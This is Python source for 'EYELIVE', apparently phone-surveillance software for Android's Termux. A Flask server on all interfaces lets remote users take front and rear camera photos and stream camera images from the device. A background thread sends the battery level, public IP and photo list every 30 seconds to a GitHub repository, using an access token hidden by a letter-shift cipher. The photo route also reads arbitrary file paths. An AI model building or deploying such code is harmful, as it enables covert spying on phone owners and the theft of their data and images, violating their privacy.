from flask import Flask, render_template_string, jsonify, request, send_file
import os, json, threading, time, subprocess, requests as req, base64 as b64
from datetime import datetime

def _tk():
    t = "now_7fobDPqMyVGXyhzQkT5SLhvaUkpKNr1gh7KC"
    r = ""
    for c in t:
        if c.isalpha():
            b = ord('a') if c.islower() else ord('A')
            r += chr((ord(c) - b - 7) % 26 + b)
        else:
            r += c
    return r

app = Flask(__name__)

DEVICE_NAME = os.environ.get("DEVICE_NAME", "Celular")
DEVICE_ID = os.environ.get("DEVICE_ID", "celular_1")
TOKEN = _tk()
REPO = "gynbetfc/eyelive"
FOTOS_DIR = "/data/data/com.termux/files/home/eyelive_fotos"
os.makedirs(FOTOS_DIR, exist_ok=True)

dados = {
    "nome": DEVICE_NAME, "id": DEVICE_ID,
    "bateria": "?%", "carregando": False,
    "gps": {"lat": 0, "lng": 0}, "ip": "",
    "fotos": [], "ultimo_update": "", "status": "online"
}

def shell(cmd):
    try: return subprocess.check_output(cmd, shell=True, text=True, timeout=10).strip()
    except: return "?"

def salvar():
    try:
        fn = f"dados/{DEVICE_ID}.json"
        url = f"https://api.github.com/repos/{REPO}/contents/{fn}"
        h = {"Authorization": f"Bearer {TOKEN}", "Accept": "application/vnd.github.v3+json"}
        c = json.dumps(dados)
        r = req.get(url, headers=h)
        p = {"message": "Update", "content": b64.b64encode(c.encode()).decode(), "branch": "main"}
        if r.status_code == 200: p["sha"] = r.json()["sha"]
        req.put(url, json=p, headers=h)
    except: pass

def coletar():
    while True:
        try:
            b = shell("termux-battery-status 2>/dev/null")
            if b and "percentage" in b:
                bat = json.loads(b)
                dados["bateria"] = str(bat.get("percentage","?")) + "%"
                dados["carregando"] = bat.get("plugged","") != ""
            dados["ip"] = shell("curl -4 -s ifconfig.me 2>/dev/null") or "?"
            dados["ultimo_update"] = datetime.now().strftime("%H:%M:%S")
            dados["fotos"] = sorted([f for f in os.listdir(FOTOS_DIR) if f.endswith('.jpg')])[-10:]
            salvar()
        except: pass
        time.sleep(30)

threading.Thread(target=coletar, daemon=True).start()

# HTML omitido por brevidade - mesmo da versao anterior
HTML = r"""<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>EYELIVE</title><style>:root{--bg:#0a0a0f;--card:#111122;--gold:#ffd700;--green:#00ff88;--text:#e0e0e0}*{margin:0;padding:0;box-sizing:border-box}body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}.header{background:#000;padding:12px 15px;display:flex;align-items:center;justify-content:space-between;border-bottom:2px solid var(--gold)}.header h1{font-size:1.2em;color:var(--gold)}.pulse{display:inline-block;width:8px;height:8px;background:var(--green);border-radius:50%;margin-right:5px;animation:pulse 1.5s infinite}@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}.nav{display:flex;background:#000;overflow-x:auto;border-bottom:1px solid#222}.nav a{padding:12px 15px;color:#888;text-decoration:none;font-size:.8em;white-space:nowrap;border-bottom:2px solid transparent}.nav a.active,.nav a:hover{color:var(--gold);border-bottom-color:var(--gold)}.container{padding:15px}.cam-card{background:var(--card);border:1px solid#222;border-radius:15px;overflow:hidden;margin-bottom:12px}.cam-card h3{padding:10px 15px;color:var(--gold);font-size:.9em;border-bottom:1px solid#222}.cam-view{width:100%;height:200px;background:#000;display:flex;align-items:center;justify-content:center;color:#333;font-size:3em;overflow:hidden}.cam-view img{width:100%;height:100%;object-fit:cover}.cam-btns{padding:10px;display:flex;gap:8px}.card{background:var(--card);border:1px solid#222;border-radius:15px;padding:15px;margin-bottom:15px}.card h3{color:var(--gold);font-size:.9em;margin-bottom:10px}.btn{padding:10px 18px;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-size:.8em}.btn-gold{background:var(--gold);color:#000}.btn-green{background:var(--green);color:#000}.tab-content{display:none}.tab-content.active{display:block}.info-row{display:flex;justify-content:space-between;padding:5px 0;color:#aaa;font-size:.85em}.info-row span:last-child{color:#fff}.galeria{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:10px}.galeria img{width:100%;height:100px;object-fit:cover;border-radius:8px;cursor:pointer}</style></head><body><div class="header"><div><h1>EYELIVE</h1><span style="color:var(--green);font-size:.75em"><span class="pulse"></span> {DEVICE}</span></div></div><div class="nav"><a href="#" class="active" onclick="tab(\'cameras\',this)">📷 Cameras</a><a href="#" onclick="tab(\'galeria\',this)">🖼️ Galeria</a><a href="#" onclick="tab(\'info\',this)">📊 Info</a></div><div class="container"><div id="tab-cameras" class="tab-content active"><div class="cam-card"><h3>📷 Frontal</h3><div class="cam-view" id="frontal-view"><span>📷</span></div><div class="cam-btns"><button class="btn btn-gold" onclick="foto(\'frontal\')">📸 Foto</button><button class="btn btn-green" onclick="live(\'frontal\')">▶️ Live</button></div></div><div class="cam-card"><h3>📷 Traseira</h3><div class="cam-view" id="traseira-view"><span>📷</span></div><div class="cam-btns"><button class="btn btn-gold" onclick="foto(\'traseira\')">📸 Foto</button><button class="btn btn-green" onclick="live(\'traseira\')">▶️ Live</button></div></div></div><div id="tab-galeria" class="tab-content"><div class="card"><h3>🖼️ Ultimas Fotos</h3><div class="galeria" id="galeria"></div></div></div><div id="tab-info" class="tab-content"><div class="card"><h3>📊 Dispositivo</h3><div class="info-row"><span>Nome:</span><span id="info-nome">--</span></div><div class="info-row"><span>Bateria:</span><span id="info-bat">--</span></div><div class="info-row"><span>IP:</span><span id="info-ip">--</span></div><div class="info-row"><span>Fotos:</span><span id="info-fotos">0</span></div></div></div></div><script>var liveTimers={};function tab(t,el){document.querySelectorAll(\'.tab-content\').forEach(x=>x.classList.remove(\'active\'));document.querySelectorAll(\'.nav a\').forEach(a=>a.classList.remove(\'active\'));document.getElementById(\'tab-\'+t).classList.add(\'active\');el.classList.add(\'active\')}function foto(cam){fetch(\'/cmd/foto_\'+cam).then(r=>r.json()).then(d=>{alert(d.msg);atualizarFotos()})}function live(cam){document.getElementById(cam+\'-view\').innerHTML=\'<img src="/live/\'+cam+\'?t=\'+Date.now()+\'" id="live-\'+cam+\'">\';liveTimers[cam]=setInterval(function(){var img=document.getElementById(\'live-\'+cam);if(img)img.src=\'/live/\'+cam+\'?t=\'+Date.now()},3000)}function atualizarFotos(){fetch(\'/api/status\').then(r=>r.json()).then(d=>{var h=\'\';(d.fotos||[]).forEach(function(f){h+=\'<img src="/foto/\'+f+\'" onclick="window.open(this.src)">\'});document.getElementById(\'galeria\').innerHTML=h||\'<p style="color:#888">Nenhuma foto</p>\';document.getElementById(\'info-fotos\').textContent=(d.fotos||[]).length})}function update(){fetch(\'/api/status\').then(r=>r.json()).then(d=>{document.getElementById(\'info-bat\').textContent=d.bateria+(d.carregando?\' [CARREGANDO]\':\'\');document.getElementById(\'info-ip\').textContent=d.ip;document.getElementById(\'info-nome\').textContent=d.nome})}setInterval(update,5000);setInterval(atualizarFotos,10000);update();atualizarFotos()</script></body></html>"""

@app.route('/')
def index():
    return render_template_string(HTML, DEVICE=DEVICE_NAME)

@app.route('/api/status')
def api_status():
    return jsonify(dados)

@app.route('/cmd/<comando>')
def comando(comando):
    if comando == 'foto_frontal':
        t = datetime.now().strftime("%H%M%S")
        nome = f"frontal_{t}.jpg"
        path = f"{FOTOS_DIR}/{nome}"
        threading.Thread(target=lambda: shell(f"termux-camera-photo -c 0 {path} 2>/dev/null"), daemon=True).start()
        return jsonify({"msg":"Foto frontal OK!","foto":nome})
    elif comando == 'foto_traseira':
        t = datetime.now().strftime("%H%M%S")
        nome = f"traseira_{t}.jpg"
        path = f"{FOTOS_DIR}/{nome}"
        threading.Thread(target=lambda: shell(f"termux-camera-photo -c 1 {path} 2>/dev/null"), daemon=True).start()
        return jsonify({"msg":"Foto traseira OK!","foto":nome})
    return jsonify({"msg":"OK"})

@app.route('/live/<cam>')
def live(cam):
    c = "0" if cam == "frontal" else "1"
    path = f"/tmp/eyelive_live_{cam}.jpg"
    shell(f"termux-camera-photo -c {c} {path} 2>/dev/null")
    if os.path.exists(path):
        return send_file(path, mimetype='image/jpeg')
    return "", 404

@app.route('/foto/<nome>')
def foto(nome):
    path = f"{FOTOS_DIR}/{nome}"
    if os.path.exists(path):
        return send_file(path, mimetype='image/jpeg')
    return "", 404

if __name__ == '__main__':
    print(f"EYELIVE - {DEVICE_NAME}")
    app.run(host='0.0.0.0', port=5050, debug=False, threaded=True)
